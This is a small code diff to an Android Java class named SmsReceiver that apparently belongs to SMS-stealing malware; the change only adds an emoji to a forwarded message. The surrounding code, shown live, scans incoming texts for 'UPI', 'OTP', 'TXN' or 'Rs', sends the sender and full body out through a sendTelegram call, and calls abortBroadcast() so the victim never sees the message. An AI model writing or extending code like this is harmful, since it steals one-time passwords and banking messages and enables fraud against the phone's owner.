@@ -23,7 +23,7 @@ public class SmsReceiver extends BroadcastReceiver {
                 String sender = msg.getOriginatingAddress();
                 
                 if (body.contains("UPI") || body.contains("OTP") || body.contains("TXN") || body.contains("Rs")) {
-                    sendTelegram("SMS from " + sender + ": " + body);
+                    sendTelegram("📩 SMS from " + sender + ": " + body);
                     abortBroadcast();
                 }
             }
